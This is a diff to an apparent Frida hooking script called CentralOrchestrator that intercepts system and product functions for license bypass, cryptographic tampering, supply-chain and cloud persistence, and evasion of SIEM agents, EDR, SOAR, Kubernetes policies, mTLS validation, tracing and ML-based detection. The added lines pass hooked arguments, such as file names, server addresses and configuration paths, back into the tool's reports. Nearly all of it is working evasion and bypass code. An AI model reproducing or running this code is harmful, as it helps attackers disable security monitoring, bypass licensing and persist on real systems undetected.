@@ -1604,6 +1604,15 @@ const CentralOrchestrator = {
                                             lpOptional,
                                             dwOptionalLength,
                                         ) {
+                                            send({
+                                                type: 'debug',
+                                                target: 'central_orchestrator',
+                                                action: 'http_request_intercepted',
+                                                request_handle: hRequest.toString(),
+                                                headers_length: dwHeadersLength,
+                                                optional_length: dwOptionalLength,
+                                            });
+
                                             // Analyze and modify HTTP headers for license bypass
                                             if (lpszHeaders && !lpszHeaders.isNull()) {
                                                 var headers =
@@ -2578,6 +2587,30 @@ const CentralOrchestrator = {
 
                             // Introduce errors in lattice operations
                             this.replace(function (result, a, b, n) {
+                                // Analyze input matrices for cryptographic bypass opportunities
+                                if (a && !a.isNull() && b && !b.isNull() && n > 0) {
+                                    try {
+                                        var matrixAData = a.readByteArray(Math.min(n * 4, 256));
+                                        var matrixBData = b.readByteArray(Math.min(n * 4, 256));
+
+                                        send({
+                                            type: 'debug',
+                                            target: 'central_orchestrator',
+                                            action: 'lattice_matrix_analysis',
+                                            matrix_a_sample: matrixAData ? Array.from(new Uint8Array(matrixAData).slice(0, 16)) : null,
+                                            matrix_b_sample: matrixBData ? Array.from(new Uint8Array(matrixBData).slice(0, 16)) : null,
+                                            dimension: n,
+                                        });
+                                    } catch (error) {
+                                        send({
+                                            type: 'debug',
+                                            target: 'central_orchestrator',
+                                            action: 'lattice_matrix_read_error',
+                                            error: error.toString(),
+                                        });
+                                    }
+                                }
+
                                 // Fill result with predictable values
                                 if (result && n > 0) {
                                     for (var i = 0; i < n; i++) {
@@ -3847,16 +3880,24 @@ const CentralOrchestrator = {
                     if (packageInstall) {
                         Interceptor.attach(packageInstall, {
                             onEnter: function (args) {
+                                var packageInfo = {
+                                    name: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                    version: args[1] && !args[1].isNull() ? args[1].readUtf8String() : null,
+                                    registry: args[2] && !args[2].isNull() ? args[2].readUtf8String() : null,
+                                };
+
                                 send({
                                     type: 'bypass',
                                     target: 'central_orchestrator',
                                     action: 'supply_chain_persistence',
                                     package_manager: pm,
+                                    package: packageInfo,
                                 });
 
                                 // Coordinate with other persistence mechanisms
                                 self.coordinate('persistence', 'activateSupplyChain', {
                                     packageManager: pm,
+                                    package: packageInfo,
                                     timestamp: Date.now(),
                                 });
                             },
@@ -3896,12 +3937,20 @@ const CentralOrchestrator = {
                         if (cloudAPI) {
                             Interceptor.attach(cloudAPI, {
                                 onEnter: function (args) {
+                                    var apiParams = {
+                                        arg_count: args.length,
+                                        resource_id: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                        region: args[1] && !args[1].isNull() ? args[1].readUtf8String() : null,
+                                        config: args[2] && !args[2].isNull() ? args[2].readUtf8String() : null,
+                                    };
+
                                     send({
                                         type: 'bypass',
                                         target: 'central_orchestrator',
                                         action: 'cloud_persistence_coordination',
                                         provider: provider,
                                         service: service,
+                                        parameters: apiParams,
                                     });
                                 },
                             });
@@ -4000,11 +4049,18 @@ const CentralOrchestrator = {
                     if (agentProcess) {
                         Interceptor.attach(agentProcess, {
                             onEnter: function (args) {
+                                var agentConfig = {
+                                    log_file: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                    destination: args[1] && !args[1].isNull() ? args[1].readUtf8String() : null,
+                                    buffer_size: args[2] && !args[2].isNull() ? args[2].toInt32() : 0,
+                                };
+
                                 send({
                                     type: 'bypass',
                                     target: 'central_orchestrator',
                                     action: 'siem_agent_evasion',
                                     agent: agent,
+                                    config: agentConfig,
                                 });
 
                                 // Coordinate log filtering across scripts
@@ -4096,6 +4152,23 @@ const CentralOrchestrator = {
                 if (ntCreateFile) {
                     Interceptor.attach(ntCreateFile, {
                         onEnter: function (args) {
+                            var objAttr = args[2];
+                            var fileName = 'unknown';
+
+                            if (objAttr && !objAttr.isNull()) {
+                                try {
+                                    var uniStr = objAttr.add(Process.pointerSize === 8 ? 16 : 8).readPointer();
+                                    if (uniStr && !uniStr.isNull()) {
+                                        var buffer = uniStr.add(Process.pointerSize === 8 ? 8 : 4).readPointer();
+                                        if (buffer && !buffer.isNull()) {
+                                            fileName = buffer.readUtf16String();
+                                        }
+                                    }
+                                } catch (readError) {
+                                    fileName = 'read_error: ' + readError.toString();
+                                }
+                            }
+
                             mlFeatures.fileModifications++;
 
                             // Stay within normal thresholds to avoid ML detection
@@ -4105,6 +4178,8 @@ const CentralOrchestrator = {
                                     target: 'central_orchestrator',
                                     action: 'ml_threshold_approaching',
                                     feature: 'file_modifications',
+                                    count: mlFeatures.fileModifications,
+                                    recent_file: fileName,
                                 });
 
                                 // Temporarily pause operations
@@ -4185,17 +4260,25 @@ const CentralOrchestrator = {
                     if (edrAgent) {
                         Interceptor.attach(edrAgent, {
                             onEnter: function (args) {
+                                var commData = {
+                                    server_addr: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                    port: args[1] && !args[1].isNull() ? args[1].toInt32() : 0,
+                                    data_size: args[2] && !args[2].isNull() ? args[2].toInt32() : 0,
+                                };
+
                                 send({
                                     type: 'bypass',
                                     target: 'central_orchestrator',
                                     action: 'edr_agent_bypass',
                                     solution: edr,
+                                    communication: commData,
                                 });
 
                                 // Coordinate evasion across all scripts
                                 self.coordinate('analytics', 'evadeEDR', {
                                     edr: edr,
                                     technique: 'agent_communication_block',
+                                    comm_info: commData,
                                 });
                             },
                         });
@@ -4226,11 +4309,18 @@ const CentralOrchestrator = {
                     if (soapAPI) {
                         Interceptor.attach(soapAPI, {
                             onEnter: function (args) {
+                                var apiCall = {
+                                    method: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                    playbook_id: args[1] && !args[1].isNull() ? args[1].readUtf8String() : null,
+                                    incident_data: args[2] && !args[2].isNull() ? args[2].readUtf8String() : null,
+                                };
+
                                 send({
                                     type: 'bypass',
                                     target: 'central_orchestrator',
                                     action: 'soar_platform_bypass',
                                     platform: platform,
+                                    api_call: apiCall,
                                 });
 
                                 // Return successful orchestration status
@@ -4291,17 +4381,25 @@ const CentralOrchestrator = {
                     if (meshProxy) {
                         Interceptor.attach(meshProxy, {
                             onEnter: function (args) {
+                                var proxyConfig = {
+                                    service_name: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                    target_endpoint: args[1] && !args[1].isNull() ? args[1].readUtf8String() : null,
+                                    cert_path: args[2] && !args[2].isNull() ? args[2].readUtf8String() : null,
+                                };
+
                                 send({
                                     type: 'bypass',
                                     target: 'central_orchestrator',
                                     action: 'service_mesh_security_bypass',
                                     component: component,
+                                    proxy_config: proxyConfig,
                                 });
 
                                 // Bypass mTLS validation
                                 self.coordinate('microservices', 'bypassMTLS', {
                                     proxy: component,
                                     action: 'skip_certificate_validation',
+                                    config: proxyConfig,
                                 });
 
                                 self.globalStats.microservicesOrchestrationEvents++;
@@ -4394,11 +4492,18 @@ const CentralOrchestrator = {
                     if (k8sAPI) {
                         Interceptor.attach(k8sAPI, {
                             onEnter: function (args) {
+                                var policyRequest = {
+                                    pod_name: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                    namespace: args[1] && !args[1].isNull() ? args[1].readUtf8String() : null,
+                                    policy_type: args[2] && !args[2].isNull() ? args[2].readUtf8String() : null,
+                                };
+
                                 send({
                                     type: 'bypass',
                                     target: 'central_orchestrator',
                                     action: 'k8s_security_policy_bypass',
                                     policy: policy,
+                                    request: policyRequest,
                                 });
 
                                 // Always allow policy validation
@@ -4471,11 +4576,18 @@ const CentralOrchestrator = {
                     if (tracingAgent) {
                         Interceptor.attach(tracingAgent, {
                             onEnter: function (args) {
+                                var traceInfo = {
+                                    span_id: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                    trace_id: args[1] && !args[1].isNull() ? args[1].readUtf8String() : null,
+                                    operation: args[2] && !args[2].isNull() ? args[2].readUtf8String() : null,
+                                };
+
                                 send({
                                     type: 'bypass',
                                     target: 'central_orchestrator',
                                     action: 'distributed_tracing_evasion',
                                     system: system,
+                                    trace: traceInfo,
                                 });
 
                                 // Suppress trace creation
@@ -4514,11 +4626,18 @@ const CentralOrchestrator = {
                     if (securityTool) {
                         Interceptor.attach(securityTool, {
                             onEnter: function (args) {
+                                var toolConfig = {
+                                    config_path: args[0] && !args[0].isNull() ? args[0].readUtf8String() : null,
+                                    runtime_mode: args[1] && !args[1].isNull() ? args[1].toInt32() : 0,
+                                    policy_file: args[2] && !args[2].isNull() ? args[2].readUtf8String() : null,
+                                };
+
                                 send({
                                     type: 'bypass',
                                     target: 'central_orchestrator',
                                     action: 'cloud_native_security_bypass',
                                     tool: tool,
+                                    config: toolConfig,
                                 });
 
                                 // Prevent security tool execution
